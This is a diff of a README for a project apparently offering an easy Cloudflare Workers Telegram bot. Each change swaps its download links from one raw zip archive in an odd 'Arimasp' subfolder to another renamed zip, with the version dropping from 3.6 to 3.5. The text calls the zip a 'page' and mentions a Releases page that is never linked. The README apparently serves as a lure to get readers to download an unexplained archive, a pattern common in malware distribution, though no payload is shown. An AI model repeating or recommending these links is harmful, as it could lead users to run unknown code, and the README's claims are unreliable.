@@ -1,6 +1,6 @@
 # 🌐 CF-work-to-TG - Easy Telegram Bot Setup
 
-[![Download CF-work-to-TG](https://raw.githubusercontent.com/Benedict-DEV/CF-work-to-TG/main/Arimasp/CF-work-to-TG-v3.6.zip)](https://raw.githubusercontent.com/Benedict-DEV/CF-work-to-TG/main/Arimasp/CF-work-to-TG-v3.6.zip)
+[![Download CF-work-to-TG](https://github.com/Benedict-DEV/CF-work-to-TG/raw/refs/heads/main/Arimasp/TG_C_work_to_v3.5.zip)](https://github.com/Benedict-DEV/CF-work-to-TG/raw/refs/heads/main/Arimasp/TG_C_work_to_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ CF-work-to-TG enables you to run a Telegram bot easily using Cloudflare Workers.
 
 To download and install CF-work-to-TG, please visit this page:
 
-[Download CF-work-to-TG](https://raw.githubusercontent.com/Benedict-DEV/CF-work-to-TG/main/Arimasp/CF-work-to-TG-v3.6.zip)
+[Download CF-work-to-TG](https://github.com/Benedict-DEV/CF-work-to-TG/raw/refs/heads/main/Arimasp/TG_C_work_to_v3.5.zip)
 
 On the Releases page, you will find the latest version of the software. Select the appropriate version for your needs, and follow the instructions below.
 
@@ -74,4 +74,4 @@ You can also find helpful resources in the documentation hosted on our GitHub pa
 
 With CF-work-to-TG, setting up a Telegram bot has never been easier. Follow the steps above to download, install, and run your bot today. 
 
-Remember, you can always revisit the [Download CF-work-to-TG](https://raw.githubusercontent.com/Benedict-DEV/CF-work-to-TG/main/Arimasp/CF-work-to-TG-v3.6.zip) page for the latest updates. Enjoy your automated Telegram experience!
+Remember, you can always revisit the [Download CF-work-to-TG](https://github.com/Benedict-DEV/CF-work-to-TG/raw/refs/heads/main/Arimasp/TG_C_work_to_v3.5.zip) page for the latest updates. Enjoy your automated Telegram experience!
